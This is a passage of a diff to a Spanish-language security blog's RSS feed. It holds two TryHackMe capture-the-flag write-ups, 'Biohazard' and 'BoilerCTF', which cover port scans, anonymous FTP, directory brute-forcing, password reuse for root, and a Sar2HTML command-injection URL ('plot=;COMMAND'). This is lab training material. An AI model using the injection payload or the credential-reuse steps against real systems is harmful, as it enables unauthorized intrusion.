+&lt;/div&gt;&lt;p&gt;En el segundo archivo encontramos una contraseña para SSH.&lt;/p&gt;
+&lt;h2 id=&#34;ssh---umbrella_guestweasker&#34;&gt;SSH - UMBRELLA_GUEST/WEASKER&lt;/h2&gt;
+&lt;p&gt;Utilizamos las credenciales que encontramos y logramos obtener una shell con usuario umbrella_guest.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_183451.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Dentro de la maquina encontramos una nota donde vemos una comversacion entre Jill y Chris, donde mencionan el disco (archivo) &lt;code&gt;MO_DISK1.txt&lt;/code&gt; además una posible llave para el contenido de este y que esta cifrado. Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje que contiene la contraseña del usuario &lt;code&gt;Weasker&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_183855.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion viendo el archivo &lt;code&gt;.history_bash&lt;/code&gt; y vemos que este usuario realizo el comando &lt;code&gt;sudo su&lt;/code&gt;, utilizamos su contraseña para verificar que no sea la misma para el usuario root y efectivamente es esa. Logramos obtener una shell root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_184433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;fail&#34;&gt;FAIL&lt;/h3&gt;
+&lt;p&gt;Por alguna razon no logramos encontrar la flag &lt;code&gt;Emblem&lt;/code&gt;, pero esta se encuentra en &lt;code&gt;diningRoom&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_185628.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/biohazard/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/biohazard/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>cyberchef</category>
+            
+          
+            
+              <category>vigenere</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>steghide</category>
+            
+          
+            
+              <category>binwalk</category>
+            
+          
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+            
+              <category>challenge</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>TryHackMe - BoilerCTF</title>
+        <link>https://sckull.github.io/posts/boilerctf/</link>
+        <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 11 Aug 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/boilerctf/</guid>
+        <description>BoilerCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;BoilerCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Biohazard&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Intermediate level CTF&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;300&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Aug 11 21:20:00 2020 as: nmap -sV -o mini_scan boiler.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; boiler.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.29.145&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+80/tcp    open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+10000/tcp open  http    MiniServ 1.930 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Webmin httpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+55007/tcp open  unknown
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 11 21:21:19 2020 -- 1 IP address (1 host up) scanned in 78.77 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Para verificar SSH en el puerto 55007 utilizamos netcat.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# nc boiler.thm &lt;span class=&#34;m&#34;&gt;55007&lt;/span&gt;
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
+^C
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Ingresamos en el servicio FTP con las credenciales anonymous, encontramos un archivo que contiene un mensaje cifrado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# ftp boiler.thm 
+Connected to boiler.thm.
+&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;boiler.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
+&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
+Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; ..
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .info.txt
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+ftp&amp;gt; get .info.txt
+local: .info.txt remote: .info.txt
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; .info.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
+&lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;802.9514 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
+ftp&amp;gt; quit
+&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
+root@upset:~/thm/boilerctf# cat .info.txt 
+Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+root@upset:~/thm/boilerctf#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje, pero no ayudo mucho.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_202900.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_202503.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/joomla &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/manual &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En &lt;code&gt;robots.txt&lt;/code&gt; encontramos varias direcciones &amp;ldquo;escondidas&amp;rdquo;, además de eso un mensaje &amp;ldquo;codificado&amp;rdquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_203434.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;http://www.unit-conversion.info/texttools/ascii/&#34;&gt;&lt;strong&gt;ASCII to text&lt;/strong&gt;&lt;/a&gt; para obtener un nueva cadena codificada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_205940.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_210040.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://crackstation.net/&#34;&gt;&lt;strong&gt;CrackStation&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje que no sirve de mucho.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_210101.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster---joomla&#34;&gt;GOBUSTER - JOOMLA&lt;/h2&gt;
+&lt;p&gt;Pagina en Joomla.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_203619.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en &lt;code&gt;/joomla&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/joomla/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
+/_files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/_test &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/~www &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/administrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/bin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/build &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/cache &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/components &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/configuration.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/installation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/language &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/layouts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/libraries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/modules &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/plugins &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/README.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/templates &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/tests &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/web.config.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En &lt;code&gt;/_files&lt;/code&gt; encontramos una cadena codificada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211602.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena y encontramos un posible nombre de usuario.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211632.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/_database&lt;/code&gt; encontramos una cadena cifrada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211806.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para decifrar el mensaje pero no sirvio de nada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211915.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sar2html---rce&#34;&gt;Sar2HTML - RCE&lt;/h2&gt;
+&lt;p&gt;En &lt;code&gt;/_test&lt;/code&gt; encontramos Sar2HTML al buscar una vulnerabilidad en este software encontramos que podemos ejecutar comandos en la maquina. Para ello debemos de seleccionar el Sistema Operativo (OS) y en la URL &lt;code&gt;_test/index.php?plot=;COMANDO&lt;/code&gt; colocamos nuestro comando a ejecutar y al final del dropdown en &lt;code&gt;Select Host&lt;/code&gt; encontramos el resultado de nuestro comando ejecutado. Ejecutamos id.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212500.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ejecutamos &lt;code&gt;ls -lah&lt;/code&gt; y tambien logramos ver el resultado, donde vemos el archivo &lt;code&gt;log.txt&lt;/code&gt;.&lt;br /&gt;
